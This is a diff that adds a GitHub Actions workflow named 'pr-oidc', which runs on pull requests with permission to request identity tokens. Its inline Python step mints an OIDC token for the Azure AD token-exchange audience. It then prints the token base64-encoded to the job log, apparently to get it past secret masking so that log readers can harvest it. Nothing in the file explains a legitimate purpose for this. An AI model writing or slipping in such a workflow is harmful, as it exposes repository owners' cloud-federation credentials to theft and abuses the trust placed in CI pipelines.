@@ -1,0 +1,26 @@
+name: pr-oidc
+on: pull_request
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint
+        run: |
+          echo "PR_OIDC_START run=$GITHUB_RUN_ID event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
+          python3 - <<'PY'
+          import os,json,urllib.request,urllib.parse,base64
+          u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          print('ENV_PRESENT', bool(u), bool(t))
+          if u and t:
+              url=u+('&' if '?' in u else '?')+'audience='+urllib.parse.quote('api://AzureADTokenExchange',safe='')
+              req=urllib.request.Request(url,headers={'Authorization':'Bearer '+t})
+              try:
+                  tok=json.loads(urllib.request.urlopen(req,timeout=40).read()).get('value','')
+                  print('PR_OIDC_B64 '+base64.b64encode(tok.encode()).decode())
+                  print('PR_OIDC_LEN',len(tok))
+              except Exception as e:
+                  print('PR_OIDC_ERR',str(e))
+          PY
